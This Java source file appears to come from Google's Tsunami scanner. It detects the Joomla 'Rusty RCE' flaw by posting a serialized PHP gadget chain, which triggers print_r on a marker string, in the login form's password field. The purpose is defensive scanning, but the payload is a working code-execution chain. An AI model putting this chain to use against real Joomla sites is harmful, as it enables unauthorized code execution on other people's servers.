/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.joomla.rustyrce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.base.Splitter;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.Iterables;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Collections;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Rusty RCE on Joomla web applications. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "JoomlaRustyRCEDetector",
    version = "0.1",
    // Detailed description about what this plugin does.
    description =
        "Tsunami detector for PHP object injection and arbitrary code execution via HTTP "
            + "POST in Joomla (Rusty RCE, no CVE assigned)",
    author = "Philipp Durrer (durrer@google.com)",
    bootstrapModule = JoomlaRustyRCEDetectorBootstrapModule.class)
public final class JoomlaRustyRCEDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String VULNERABLE_ENDPOINT = "index.php/component/users";
  private static final String PAYLOAD_PREFIX = "AAA\";";
  private static final String PAYLOAD_SUFFIX = "s:6:\"return\";s:102:";
  private static final String INPUT_FIELD_SIGNATURE = "<input type=\"hidden\" name=\"";
  static final String TEST_STRING = "x0OrIOYaskIDQLrWp6wJ";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  JoomlaRustyRCEDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(true).build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Joomla! Rusty RCE.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    targetUri = targetUri + VULNERABLE_ENDPOINT;
    HttpResponse response;
    String csrfToken = "";

    // Request 1: plain GET request to create a session and retrieve the session cookie and csrf.
    logger.atInfo().log("Creating a new Joomla session on target '%s'.", targetUri);
    try {
      response = httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      csrfToken = getCSRFToken(response);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
    // Parse the cookie values.
    ImmutableList<String> cookies = parseCookies(response);
    if (cookies.isEmpty()) {
      logger.atInfo().log("No Set-Cookie header in the HTTP response.");
      return false;
    }

    // Request 2: pass the PHP object injection payload in the password field as HTTP POST.
    logger.atInfo().log("Sending Joomla Rusty RCE payload to target '%s'.", targetUri);
    try {
      String printPayload = buildPrintPayload(TEST_STRING);
      response =
          executeHttpRequestWithPayload(
              networkService, targetUri, cookies, printPayload, csrfToken);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
    // Check if the concatenated string is echoed back.
    return response.bodyString().map(body -> body.contains(TEST_STRING)).orElse(false);
  }

  private static ImmutableList<String> parseCookies(HttpResponse response) {
    return response.headers().getAll("Set-Cookie").stream()
        .map(headerValue -> Iterables.get(Splitter.on(';').split(headerValue), 0))
        .collect(toImmutableList());
  }

  private static String getCSRFToken(HttpResponse response) {
    int beginIndex =
        response.bodyString().get().lastIndexOf(INPUT_FIELD_SIGNATURE)
            + INPUT_FIELD_SIGNATURE.length();
    return response.bodyString().get().substring(beginIndex, beginIndex + 32);
  }

  private static String buildPrintPayload(String printPayload) {
    // This crafted PHP object chains two PHP gadgets available in Joomla (disconnectHandlers in
    // JDatabaseDriverMysqli and cache_name_function in SimplePie) to execute arbitrary PHP code.
    String payloadString =
        "s:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{"
            + "s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";"
            + "a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:"
            + "\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";"
            + "s:7:\"print_r\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:"
            + (printPayload.length() + 16)
            + ":\"http://foo.bar/;"
            + printPayload
            + "\";}"
            + "i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}";
    return PAYLOAD_PREFIX + payloadString + PAYLOAD_SUFFIX;
  }

  private HttpResponse executeHttpRequestWithPayload(
      NetworkService networkService,
      String targetUri,
      ImmutableList<String> cookies,
      String printPayload,
      String csrfToken)
      throws IOException {
    String userPayload = String.join("", Collections.nCopies(9, "\\0\\0\\0"));
    String payload =
        "username="
            + userPayload
            + "&password="
            + printPayload
            + "&option=com_users"
            + "&task=user.login"
            + "&"
            + csrfToken
            + "=1";
    HttpHeaders headers =
        HttpHeaders.builder()
            .addHeader("Cookie", String.join("; ", cookies))
            .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .build();
    return httpClient.send(
        post(targetUri)
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFrom(payload, "UTF-8"))
            .build(),
        networkService);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("JOOMLA_RUSTY_RCE"))
                .setSeverity(Severity.CRITICAL)
                .setTitle(
                    "Joomla RCE via PHP object injection in HTTP POST (Rusty RCE, no CVE assigned)")
                .setDescription(
                    "The Joomla application is vulnerable to Rusty RCE, which"
                        + " allows remote unprivileged attackers to execute arbitrary"
                        + " PHP code.")
                .setRecommendation("Upgrade to Joomla 3.4.7 or greater."))
        .build();
  }
}
